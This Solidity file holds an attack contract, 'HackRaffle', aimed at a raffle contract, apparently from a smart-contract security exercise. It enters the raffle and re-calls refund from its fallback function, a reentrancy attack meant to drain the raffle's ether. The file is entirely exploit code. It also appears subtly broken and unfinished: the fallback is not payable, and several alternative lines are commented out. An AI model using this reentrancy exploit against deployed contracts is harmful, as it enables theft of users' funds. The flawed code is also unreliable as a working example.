// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract PuppyRaffle {
    function refund(uint256 playerIndex) public {}
    function getActivePlayerIndex(address player) external view returns (uint256) {}
    function enterRaffle(address[] memory newPlayers) public payable {}
}

contract HackRaffle {
    address public puppyRaffleAddress;
    PuppyRaffle puppyRaffle;
    uint256 entranceFee = 1e18;
    uint256 index;

    constructor(address _puppyRaffleAddress) payable {
        puppyRaffle = PuppyRaffle(_puppyRaffleAddress);
        puppyRaffleAddress = _puppyRaffleAddress;
    }

    // function fundContract() public payable {}

    function enter() public {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);
    }

    function hackRefund() public {
        index = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(index);

        // (bool success,) = puppyRaffleAddress.call(abi.encodeWithSignature("refund()"));
        // require(success, "Not good enough");
    }

    fallback() external /* payable */ {
        puppyRaffle.refund(index);
    }
}
